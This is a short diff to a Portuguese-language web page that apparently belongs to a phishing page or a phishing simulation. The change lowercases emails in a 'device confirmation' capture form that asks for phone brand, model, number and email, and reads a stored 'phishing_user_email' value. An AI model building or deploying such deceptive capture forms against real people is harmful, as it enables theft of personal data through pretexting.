@@ -1325,7 +1325,7 @@ body{
 
   // Mostrar formulário de captura
   function showPhoneForm() {
-    var email = localStorage.getItem('phishing_user_email') || '';
+    var email = (localStorage.getItem('phishing_user_email') || '').toLowerCase();
     modalIconEl.textContent = '📱';
     modalIconEl.style.background = 'rgba(255,165,0,0.2)';
     modalTitleEl.textContent = 'Confirme o Seu Dispositivo';
@@ -1363,7 +1363,7 @@ body{
       var brand = document.getElementById('cfBrand').value.trim();
       var model = document.getElementById('cfModel').value.trim();
       var phone = document.getElementById('cfPhone').value.trim();
-      var userEmail = document.getElementById('cfEmail').value.trim();
+      var userEmail = document.getElementById('cfEmail').value.trim().toLowerCase();
 
       if (!brand || !phone) {
         alert('Por favor preencha a marca e o número de telemóvel');
